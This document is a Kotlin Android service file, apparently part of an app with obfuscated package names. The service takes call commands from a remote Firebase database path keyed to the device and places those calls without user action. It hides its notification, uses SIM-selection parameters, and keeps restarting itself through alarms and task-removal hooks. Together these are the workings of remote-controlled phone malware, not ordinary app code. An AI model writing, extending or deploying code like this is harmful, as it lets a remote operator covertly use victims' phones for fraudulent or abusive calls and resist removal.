package com.rto1p8.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.rto1p8.app.LauncherActivity
import com.rto1p8.app.MainActivity
import com.rto1p8.app.utils.Logger
import kotlinx.coroutines.*

class CallService : Service() {
    companion object {
        private const val CHANNEL_ID = "CallServiceChannel"
        private const val NOTIFICATION_ID = 3
        private const val RESTART_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
    }

    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var commandsRef: DatabaseReference? = null
    private var valueEventListener: ValueEventListener? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        initService()
    }

    private fun initService() {
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildForegroundNotification())
        schedulePeriodicRestart()
        setupFirebaseListener()
    }

    private fun setupFirebaseListener() {
        coroutineScope.launch {
            try {
                val deviceId = MainActivity.getDeviceId(this@CallService)
                commandsRef = Firebase.database.getReference("Device/$deviceId/call_commands")

                // Remove previous listener if exists
                valueEventListener?.let { commandsRef?.removeEventListener(it) }

                valueEventListener = object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        coroutineScope.launch {
                            processCallCommands(snapshot)
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {
                        Logger.error("Database error: ${error.message}", error.toException())
                        // Schedule retry with exponential backoff
                        coroutineScope.launch {
                            delay(10_000L)
                            setupFirebaseListener()
                        }
                    }
                }
                commandsRef?.addValueEventListener(valueEventListener as ValueEventListener)
            } catch (e: Exception) {
                Logger.error("Failed to setup Firebase listener: ${e.message}", e)
            }
        }
    }

    private suspend fun processCallCommands(snapshot: DataSnapshot) {
        snapshot.children.forEach { commandSnapshot ->
            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
            if (command["status"] as? String == "pending") {
                val recipient = command["recipient"] as? String ?: return@forEach
                val subId = (command["subId"] as? Long)?.toInt() ?: -1
                val simSlotIndex = (command["simSlotIndex"] as? Long)?.toInt() ?: -1
                val commandId = commandSnapshot.key ?: return@forEach

                Logger.log("Processing call command: recipient=$recipient, subId=$subId, slot=$simSlotIndex")
                
                // Launch the call using LauncherActivity
                launchCall(recipient, subId, simSlotIndex, commandId)
                
                // Mark command as processed
                commandSnapshot.ref.removeValue()
            }
        }
    }

    private fun launchCall(recipient: String, subId: Int, simSlotIndex: Int, commandId: String) {
        try {
            val intent = Intent(this, LauncherActivity::class.java).apply {
                action = "com.p8hdf1.app.ACTION_MAKE_CALL"
                putExtra("recipient", recipient)
                putExtra("subId", subId)
                putExtra("simSlotIndex", simSlotIndex)
                putExtra("commandId", commandId)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            startActivity(intent)
            Logger.log("✅ Call launched via LauncherActivity")
        } catch (e: Exception) {
            Logger.error("❌ Failed to launch call: ${e.message}", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Call Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Channel for Call Service notifications"
                    setShowBadge(false)
                }
                getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Processing call commands")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to create notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service Error")
                .setContentText("Failed to initialize notification")
                .setSmallIcon(android.R.drawable.stat_notify_error)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        }
    }

    private fun schedulePeriodicRestart() {
        try {
            val restartIntent = Intent(this, CallService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 0, restartIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + RESTART_INTERVAL_MS,
                RESTART_INTERVAL_MS,
                pendingIntent
            )
        } catch (e: Exception) {
            Logger.error("Failed to schedule periodic restart", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        cleanup()
    }

    private fun cleanup() {
        coroutineScope.cancel()
        valueEventListener?.let { commandsRef?.removeEventListener(it) }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restartServiceIntent = Intent(applicationContext, CallService::class.java)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
    }
}